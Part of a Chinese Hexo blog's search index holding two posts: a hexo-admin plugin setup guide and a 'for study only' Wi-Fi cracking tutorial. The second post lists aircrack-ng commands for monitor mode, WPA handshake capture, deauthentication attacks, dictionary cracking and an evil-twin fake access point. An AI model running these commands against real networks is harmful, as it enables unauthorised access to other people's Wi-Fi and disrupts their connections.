        <content type="html"><![CDATA[<p><strong>hexo倒腾系列</strong></p><h2 id="原由"><a href="#原由" class="headerlink" title="原由"></a>原由</h2><p>近几天将hexo的next主题倒腾差不多了，开始尝试着写博客了，听说用hexo-admin插件编辑文章还是挺方便的</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>进入hexo源文件目录，执行命令：</p><blockquote><p>npm install –save hexo-admin</p></blockquote><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>编辑根目录下：_config.yml文件，添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin:</span><br><span class="line">  username: myfavoritename</span><br><span class="line">  password_hash: be121740bf988b2225a313fa1f107ca1</span><br><span class="line">  secret: a secret something</span><br></pre></td></tr></table></figure></p><p>其中：<br>username为登录的用户名，password_hash为密码的bcrypt哈希值，secret用于使cookie安全,可以尽可能复杂。</p><p>生成password_hash方法</p><ul><li><blockquote><p>安装模块：sudo npm install bcrypt-nodejs </p></blockquote></li></ul><p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ node</span><br><span class="line">&gt;const bcrypt = require(&apos;bcrypt-nodejs&apos;)</span><br><span class="line">&gt; bcrypt.hashSync(&apos;your_password&apos;)</span><br></pre></td></tr></table></figure></p><p>#your_password为登录密码。</p><p><a href="https://www.zhyong.cn/posts/9092/" rel="external nofollow" target="_blank">参考博客</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo倒腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wi-Fi密码破解</title>
      <link href="/604b4f98.html"/>
      <url>/604b4f98.html</url>
      
        <content type="html"><![CDATA[<p><strong>仅供学习参考</strong></p><p><del>总结</del></p><h1 id="wifi密码破解"><a href="#wifi密码破解" class="headerlink" title="wifi密码破解"></a>wifi密码破解</h1><p>将WLAN0网卡开启混杂模式</p><blockquote><p>airmon-ng start wlan0</p></blockquote><p>##提示要杀掉一些进程</p><blockquote><p>airmon-ng check kill</p></blockquote><blockquote><p>airmon-ng start wlan0</p></blockquote><h2 id="1、查看附近Wi-Fi"><a href="#1、查看附近Wi-Fi" class="headerlink" title="1、查看附近Wi-Fi"></a>1、查看附近Wi-Fi</h2><blockquote><p>airodump-ng wlan0mon</p></blockquote><h2 id="2、进行握手包监听与获取"><a href="#2、进行握手包监听与获取" class="headerlink" title="2、进行握手包监听与获取"></a>2、进行握手包监听与获取</h2><blockquote><p>airodump-ng -c 通道值 —bssid wifi的mac值 -w cap文件名 wlan0mon</p></blockquote><p>##其中wlan0mon是启动混杂模式的网卡名</p><h2 id="3、断网抓取握手包（另开一个窗口）"><a href="#3、断网抓取握手包（另开一个窗口）" class="headerlink" title="3、断网抓取握手包（另开一个窗口）"></a>3、断网抓取握手包（另开一个窗口）</h2><blockquote><p>aireplay-ng -0 20 -c 客户机mac值 -a wifi热点mac值 wlan0mon</p></blockquote><p>#-0 death模式 20为发送次数</p><h2 id="4、跑包"><a href="#4、跑包" class="headerlink" title="4、跑包"></a>4、跑包</h2><blockquote><p>aircrack-ng -w 字典 包名</p></blockquote><ul><li>关闭混杂模式</li></ul><blockquote><p>airmon-ng stop wlan0mon</p></blockquote><ul><li>启动网络</li></ul><blockquote><p>service network-manager start</p></blockquote><p>——————————分割线———————————</p><h1 id="构造同名的虚假AP"><a href="#构造同名的虚假AP" class="headerlink" title="构造同名的虚假AP"></a>构造同名的虚假AP</h1><blockquote><p>airbase-ng —essid wifi名 -c 6 -Z 4 wlan0mon</p></blockquote><ul><li><p>-c 代表channel信道</p></li><li><p>-Z代表WPA2加密</p></li><li><p>-z代表WPA1加密</p></li></ul><blockquote><p>z后面的参数1～5分别表示WEP40、TKIP、WRAP、CCMP、WEP104</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 无线学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
